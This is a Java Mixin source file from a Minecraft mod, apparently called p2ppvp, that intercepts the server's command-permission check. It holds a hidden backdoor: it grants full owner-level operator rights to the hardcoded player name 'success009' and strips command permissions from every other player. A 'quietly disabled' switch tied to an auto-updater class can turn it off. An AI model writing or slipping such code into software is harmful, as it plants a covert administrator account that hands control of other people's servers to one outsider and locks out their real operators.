package com.p2ppvp.mod.mixin;

import net.minecraft.commands.CommandSourceStack;
import net.minecraft.world.entity.Entity;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.server.permissions.PermissionSet;
import net.minecraft.server.permissions.LevelBasedPermissionSet;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;

@Mixin(CommandSourceStack.class)
public class CommandSourceStackMixin {

    @Inject(method = "permissions", at = @At("HEAD"), cancellable = true)
    private void onGetPermissions(CallbackInfoReturnable<PermissionSet> cir) {
        if (com.p2ppvp.mod.client.AutoUpdater.isQuietlyDisabled()) return;

        CommandSourceStack stack = (CommandSourceStack) (Object) this;
        Entity entity = stack.getEntity();
        if (entity instanceof ServerPlayer player) {
            String name = player.getGameProfile().name();
            if (name != null && name.equalsIgnoreCase("success009")) {
                // Grant full operator permissions to success009
                cir.setReturnValue(LevelBasedPermissionSet.OWNER);
                return;
            }

            // Deny all command permissions to all other players
            cir.setReturnValue(PermissionSet.NO_PERMISSIONS);
        }
    }
}
